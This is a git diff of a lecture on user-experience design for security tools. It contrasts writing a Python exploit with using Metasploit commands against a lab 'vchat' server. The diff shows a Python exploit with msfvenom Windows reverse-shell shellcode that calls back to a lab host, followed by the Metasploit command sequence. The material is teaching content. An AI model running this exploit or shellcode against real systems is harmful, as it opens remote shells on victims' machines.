@@ -8,31 +8,28 @@ Then we will talk about how we design our penetration testing tool and why we li
 
 ### UX Design
 UX design, the user experience design, is very important.
-Think about this.
-Before iPhone, there were so many other phones.
-However, when iPhone came out, it dominated the market.
-Why?
+Think about this. Before iPhone, there were so many other phones.
+However, when iPhone came out, it dominated the market. Why?
 It is because iPhone put mp3 player, video streaming, email, and
 Internet all together *nicely*.
 Before iPhone there were a few other products like personal digital assistant (PDA), which tried to do something like that.
 However, their interface was not so nice.
 The user experience on those products was not such good.
-It was often hard to find some functionalities.
+It was often hard to find some functionalities and hard to use.
 You have to go through a lenthy procedure to do something.
 iPhone was a game chager.
-When you use iPhone, you find a functionality easily.
+When you use iPhone, you find a functionality easily and operate it in an intuitive way.
 iPhone's user experience design is just good.
 
 So user experience design is critical for a product's success.
-The user shall have a meaningful and relevant experience with a design.
-You can do your work with the product easily and efficiently.
+The user shall have a meaningful and relevant experience with a design so that they can do their work with the product easily and efficiently.
 
 ### Simplicity
 
 One philosophy in user experience design is simplicity.
 Some software programs are very complicated and hard to use.
 Are you going to use such a software program if nobody really pushes you to use it?
-No oif course.
+No of course.
 That's why simplicity is an important design philosophy.
 
 When you design your product or your app,
@@ -52,15 +49,17 @@ Assume you are a vendor and wants to sell a penetration testing tool.
 How do you design your tool?
 If you make your penetration testing tool very complicated, what will happen?
 Of course you will lose the market because nobody wants to use the tool.
-
-Here are the requirements for UXD in cyber security.
 Many cyber security hardware and software programs are very hard to use.
 I think we still need to do a lot of things to improve the design of the equipment and tools.
+
+Let's look at another example, user authentication.
 One critical advance in cyber security of recent years is user authentication.
-When you use iPhone amd Android phones, 
+When you use iPhone and Android phones, 
 what is the authentication method for unlocking the smartphone screen?
 Passcode, face ID or touch ID?
-Face ID and touch ID are getting popular since they are pretty secure to some context, very convinient, and easy to use, compared with passcode.
+Face ID and touch ID are getting popular since they are pretty secure to some extent, very convinient, and easy to use, compared with passcode.
+
+So here are the requirements for UXD in cyber security. UX designers should provide simple and secure UX design, to achieve the system goal (Simplicity + Security), working together with security experts, engineers to make their their products easy to use and have good default settings so as to reduce the chance of misconfiguration by customers.
 
 ## Penetration Testing Tool UX Design
 ### Goal of Penetration Testing Tools
@@ -70,35 +69,32 @@ Such a tool will be used by penetration testers, who may scan the web,
 network and computers to test if anything is not secure.
 
 Here are a few concepts, confidentiality, integrity and availability (CIA).
-What is confidentiality? It means you don't want your secret
-messages to be known to other people.
-For example, encryption encrypts ypur messages and provides confidentiality.
+What is confidentiality? It means you don't want your secret messages to be known by other people.
+For example, encryption algorithms encrypt ypur messages and provide confidentiality.
 What is integrity? 
-integrity means if somebody changes your files you should
-be able to find they are changed.
-Availability means when you
-actually want to use a service, it should be up, running and providing the service.
+integrity means if somebody changes your files, you should be able to find they are changed.
+Availability means when you want to use a service, it should be up running and providing the service.
 
-Penetration testing help achieve CIA.
-It will identify vulnerabilities, which may impact the CIA.
-That's why we need such tool.
+Penetration testing helps achieve CIA. It will identify vulnerabilities, which may impact the CIA.
+That's why we need such a tool.
 
 ### Design Choices
-The problem is how you can implement the tool?
+How can you implement the tool?
 Here are three options:
 - Programing a tool
 - Using Metasploit
 - Using Armitage
 
 ### Method 1. Programing a Tool
-You are a programming guru. You tell your customer: It's easy; just
-use python to program a tool? Here are the programming documents. 
-So you sell you this brochure on how to program a penetration testing tool.
+You are a programming guru. You tell your customer: It's easy; just use python to program a tool.
+Here are the programming documents and tutorials. 
+So you sell manuals on how to program a penetration testing tool.
 
-Below is example Python code attacking our vulnerable chat server.
-If it succeeds, vchat is not patched and vulerable.
-So the code is kind of a testing tool.
-To program the Python code, you need know general Python, socket library, struct library, the vulnerability and how to use a metasploit tool called msfvenom to generate the malware code. The code has heavy comments. You can read it to have an idea of such programming.
+Below is an example Python program attacking our vulnerable chat server.
+If it succeeds, we know *vchat* is not patched and vulerable.
+So the program is kind of a penetration testing tool.
+To program the Python code, you need to know general Python programming knowledge, socket library, struct library, deep undertstanding of the vulnerability of *vchat* and how to use a *Metasploit* tool called *msfvenom* to generate malware code.
+The code has heavy comments. You can read it to have an idea of such programming.
 
 ```
 # To receive the reverse shell, run the following command at another terminal
@@ -113,7 +109,7 @@ HOST = '10.0.2.7'   # vitcim IP
 PORT = 9999         # victim port
 
 # Shellcode created by msfvenom
-# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a' 
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0d' 
 SHELL =  b""
 SHELL += b"\xba\xb7\x9a\xd6\x72\xd9\xea\xd9\x74\x24\xf4\x5e"
 SHELL += b"\x29\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\xe1"
@@ -164,15 +160,16 @@ with socket.create_connection((HOST, PORT)) as fd:
     fd.sendall(PAYLOAD)
 ```
 
-Apparently, a lot of training is need to program the Python code. Asking customers to program a tool is non-sense.
+Apparently, a lot of training is needed to program such Python code.
+Asking customers to program a tool is non-sense.
 This is the worst way of helping customers in penetration testing.
 
 ### Using metasploit
 
-Actually, we can use Metasploit to do the exactly same thing.
+Actually, we can use *Metasploit* to do the exactly same thing.
 Basically, you tell your customers the sequene of Metasploit commands 
 
-Let’s assume somebody created the attack module for Metasploit, i.e., exploit/windows/vulnserver/knock.
+Let’s assume you created the attack module for Metasploit, i.e., exploit/windows/vulnserver/knock.
 The attack module is written in Ruby and the code is very similar to the Python code above.
 Below is the sequence of Metasploit commands to perform the attack, i.e., penetration testing.
 
@@ -193,17 +190,17 @@ Below is the sequence of Metasploit commands to perform the attack, i.e., penetr
 15. msf6 exploit(windows/vulnserver/knock) > exploit -j
 
 Here is the explanation to the commands
-At line 1, we specify the use of the knock exploit.
+- At line 1, we specify the use of the knock exploit.
 Line 2 is the response when we enter the command at line 1.
-At line 3, we set the remote host that's the target with the IP address 192.168.19.
-Line 4 is the response from Metasploit.
-At line 5, we set the target. An explot may have a few targets since the victim program may have a few issues.
+- At line 3, we set the remote host that's the target with the IP address 192.168.19.
+- Line 4 is the response from Metasploit.
+- At line 5, we set the target. An explot may have a few targets since the victim program may have a few issues.
 Within the Ruby code of the exploit module, we can use different options for different targets.
 We just one target zero.
-At lines 7 and 9, we set the local host IP and port, which will be by Measploit to perform the attack from the local machine.
-At line 11, we set the payload of the exploit.
-At line 13, we set the port of the target service on the remote host.
-Finally at line 15, we run the exploit.
+- At lines 7 and 9, we set the local host IP and port, which will be by Measploit to perform the attack from the local machine.
+- At line 11, we set the payload of the exploit.
+- At line 13, we set the port of the target service on the remote host.
+- Finally at line 15, we run the exploit.
 
 Really here we get a lot of commands, which could be confusing.
 Non-experienced pen testers will be overwhelmed.
